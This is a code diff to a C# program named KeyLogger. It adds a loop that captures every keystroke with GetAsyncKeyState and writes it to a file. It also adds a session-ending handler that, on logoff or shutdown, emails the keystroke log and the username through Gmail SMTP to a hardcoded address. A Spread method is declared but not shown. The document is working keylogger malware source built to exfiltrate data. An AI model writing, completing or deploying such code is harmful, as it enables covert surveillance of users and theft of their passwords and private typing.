@@ -60,32 +60,76 @@ namespace KeyLogger
                     {
                         Thread.Sleep(10);
 
+                        for (int i = 0; i < 255; i++)
+                        {
+                            var keyState = GetAsyncKeyState(i);
 
-
-
-
-
-
+                            if (keyState == 1 || keyState == -32767)
+                            {
+                                SystemEvents.SessionEnding += SystemEventsSessionEnding;
+                                writer.WriteLine((Keys)i);
+                                writer.Flush();
+                                break;
+                            }
+                        }
                     }
                 }
             }
             catch (Exception ex)
             {
+                SystemEvents.SessionEnding -= SystemEventsSessionEnding;
                 return;
             }
         }
 
-        private static void SystemEvents()
-        { 
-        
+        private static void SystemEventsSessionEnding(object sender, SessionEndingEventArgs e)
+        {
+            checkSystemEvents = true;
+            var program = new Program();
 
-
+            switch (e.Reason)
+            {
+                case SessionEndReasons.Logoff:
+                    program.SendMail();
+                    break;
+                case SessionEndReasons.SystemShutdown:
+                    program.SendMail();
+                    break;
+                default:
+                    break;
+            }
         }
 
         private void SendMail()
-        { 
+        {
+            var program = new Program();
+            var date = DateTime.Now.ToString("dd-MM-yyyy-HH-mm");
+            var user = Environment.UserName;
 
-        
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
+                mail.From = new MailAddress("witviers@gmail.com");
+                mail.To.Add("witviers@gmail.com");
+                mail.Subject = $"Kays from {date}";
+                mail.Body = $"Keystrokes saved from User: {user}";
+
+                var attachment = new Attachment(filePath);
+                mail.Attachments.Add(attachment);
+
+                smtpServer.Port = 587;
+                smtpServer.Credentials = new System.Net.NetworkCredential("witviers@gmail.com", "haslo do maila");
+  
+
+
+
+            }
+            catch (Exception ex)
+            {
+
+                throw;
+            }
         }
 
         private void Spread()
